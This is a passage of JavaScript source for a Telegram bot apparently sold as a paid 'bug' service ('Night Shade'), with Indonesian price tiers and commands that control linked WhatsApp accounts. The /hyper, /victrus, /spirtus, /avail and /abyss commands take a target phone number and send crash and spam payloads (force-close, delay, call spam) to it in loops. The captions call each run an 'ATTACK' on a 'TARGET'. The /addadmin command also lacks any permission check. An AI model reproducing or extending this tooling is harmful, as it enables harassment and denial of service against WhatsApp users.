━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."
┏━⪼「 ʜᴀʀɢᴀ ᴊᴏɪɴ 」
┃𖥂 Full Update 
┃    ╰➤ 5.000ʀᴘ ᴘʀᴏᴍᴏ ʀᴀᴍᴀᴅʜᴀɴ
┃𖥂 Reseller
┃    ╰➤ 15.000ʀᴘ ᴘʀᴏᴍᴏ ʀᴀᴍᴀᴅʜᴀɴ
┃𖥂 Partner
┃    ╰➤ 35.000ʀᴘ
┃𖥂 Moderator
┃    ╰➤ 40.000ʀᴘ
┃𖥂 Ceo
┃    ╰➤ 55.000ʀᴘ
┃𖥂 Owner
┃    ╰➤ 65.000ʀᴘ
┃𖥂 Vvip 
┃    ╰➤ 80.000ʀᴘ
┗━━━━━━━━━━━━━━⪼\`\`\``;
// DI ATAS ISI LIST MENU ELU
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }

      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  
  
        if (query.data === "back_to_main") {
      caption = `\`\`\`javascript
╔═════✦༻💀༺✦═══════╗
      𝐖𝐄𝐋𝐂𝐎𝐌𝐄 — 𝐔𝐒𝐄𝐑𝐒
╚═════✦༻💀༺✦═══════╝

System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
INFORMATION
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."\`\`\``;
replyMarkup = { inline_keyboard: [[{ text: "🔙 ƙҽɱႦαʅι", callback_data: "back_to_main" }]] };
      replyMarkup = {
        inline_keyboard: [
        [
          { text: "Trash Menu", 
            callback_data: "trashmenu", 
            style: 'Success',
            icon_custom_emoji_id: '5283069434917836059' },
          { text: "Trash Bebas Spam", 
            callback_data: "trashmenu2", 
            style: 'Success',
            icon_custom_emoji_id: '5283069434917836059' }
        ],
        [
          { text: "Owner Menu", 
            callback_data: "setting", 
            style: 'Danger',
            icon_custom_emoji_id: '5474209240665041113' },
          { text: "TqTo", 
            callback_data: "tqto", 
            style: 'Danger',
            icon_custom_emoji_id: '5999265900224584419' },
          { text: "Group Menu", 
            callback_data: "group", 
            style: 'Danger',
            icon_custom_emoji_id: '5258513401784573443' }
        ],
        [
          { text: "Channel", 
            url: "https://t.me/testimonijoyycloud", 
            style: 'Primary',
            icon_custom_emoji_id: '5839406384243807787' },
          { text: "Developer", 
            url: "https://t.me/joyyyclod", 
            style: 'Primary',
            icon_custom_emoji_id: '5217822164362739968' }
        ],
        [
           { text: "Harga Join Title Night Shade", 
             callback_data: "hargajoin", 
             style: 'Danger',
             icon_custom_emoji_id: '5958532907130689334' }
        ]
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo", // buat foto kalau mau ubah ke video ganti aja jadi type: "video", hurup jangan kapital
        media: "https://ibb.co.com/bMFJgwG6", // sini buat simpan foto ataupun video
        caption: caption,
        parse_mode: "HTML"//gua pakai HTML supaya tampilan bagus di dalam menu nya
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
}),

//=======CASE BUG=========//

bot.onText(/\/hyper (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/joyyyclod" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://ibb.co.com/bMFJgwG6",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 55; i++) {
      await SpamcallFcPermanen(sock, jid);
      await sleep(100);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
   }
});

bot.onText(/\/victrus (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/joyyyclod" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://ibb.co.com/bMFJgwG6",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 55; i++) {
      await DelayHard(sock, jid);
      await invisSpam(sock, jid);
      await ZhTxHxHgsGlx(sock, jid);
      await sleep(500);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/spirtus (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/joyyyclod" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://ibb.co.com/bMFJgwG6",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 20; i++) {
      await ZhTForceCloseNew(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/avail (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/joyyyclod" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://ibb.co.com/bMFJgwG6",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 30; i++) {
      await systemui(sock, jid);
      await superpowers(sock, jid);
      await sleep(500);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/abyss (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/joyyyclod" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://ibb.co.com/bMFJgwG6",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 2; i++) {
      await MakLoInpis(sock, jid);
      await sleep(9000);    
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//===================END CASE SELESEAI===============\\
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "❌ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "⚡ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "⚡ Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "⚡ Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "⚡ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "⚡ You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID. Example: /addadmin 8246978365.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. Example: /addadmin 8246978365.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `⚡ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚡ You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "⚡ Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. User ID must be a number.");
    }

